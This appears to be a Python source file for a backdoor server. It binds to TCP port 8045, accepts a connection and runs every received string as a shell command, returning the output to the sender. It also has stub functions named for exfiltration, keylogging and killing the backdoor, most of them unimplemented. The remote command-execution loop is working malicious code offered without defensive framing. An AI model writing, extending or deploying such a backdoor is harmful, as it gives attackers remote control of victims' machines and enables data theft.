import sys,os
from scapy.all import *
import socket

TCP_IP = ''
TCP_PORT = 8045
TCP_EXFIL=8046

def server(port,host):
    print ("In server")
    #clientsocket=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create socket
    #clientsocket.connect((host,port))
	#Listen for connections from the client 
	#If packet received is from the client, process it 

def choice(option): #Processing the choice entered
    if option==1:exfil()
    elif option==2:bakdoor()
    elif option==3:keylog()
    elif option==4:kill_backdoor()
    elif option==5:kill_client()
    else : print("Server can not process the choice entered")

def sendchoice(choices):
    print ("You chose: " + str(choices))

def exfil():
	print("In Exfil")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((TCP_IP, TCP_EXFIL))
	s.listen(1)
	conn, addr = s.accept()

def bakdoor():
	print("In backdoor")
	

def keylog():
    print("In Keylog")

def kill_backdoor():
    print("Killing backdoor")

def kill_client():
    print("Killing client")

def listener():
	print("In Listener")
	BUFFER_SIZE = 10000
	    
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((TCP_IP, TCP_PORT))
	s.listen(1)
	conn, addr = s.accept()
	#############
	#conn.sendall(("Target Locked").encode())
	#conn.send("\nStart sending commands\n")
	#############
	while 1:
		data = conn.recv(1024).strip()        # read the client message
		print(data.decode())
		if data.decode()=="exit": conn.sendall(("closing backdoor").encode())
		elif data.decode()=="exfil":exfil()
		elif not data: break                  # Echo it back
		else:
			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) #This command runs processes. 
			stdoutput = proc.stdout.read() + proc.stderr.read()
			#print(stdoutput.decode())
			###Add encryption here###
			conn.sendall(stdoutput)
	#exit 
	conn.close()
listener()
